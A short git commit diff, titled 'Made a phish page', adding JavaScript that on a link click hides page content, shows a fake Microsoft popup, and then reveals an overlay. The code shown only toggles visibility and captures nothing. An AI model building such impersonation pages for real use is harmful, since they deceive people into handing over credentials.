71c236cd4e7583687e7c0ca305c0b7ec888fce95
Lanmijami <milanvukasinovic5@gmail.com>
2025-08-28 12:17:27 +0200

    Made a phish page

--- script.js
+++ script.js
@@ -1,3 +1,16 @@
-const link = document.querySelector('#link');
+const link = document.getElementById('link');
+const fonContainer = document.getElementById('fon-container');
+const microsoftPopup = document.getElementById('microsoft-popup-container');
+const overlay = document.getElementById('overlay-container');
 
-link.addEventListener('click', () => {});
+link.addEventListener('click', () => {
+  fonContainer.classList.replace('block', 'hidden');
+  microsoftPopup.classList.replace('hidden', 'flex');
+
+  setInterval(openPhishingSite, 3000);
+});
+
+function openPhishingSite() {
+  microsoftPopup.classList.replace('flex', 'hidden');
+  overlay.classList.replace('hidden', 'flex');
+}
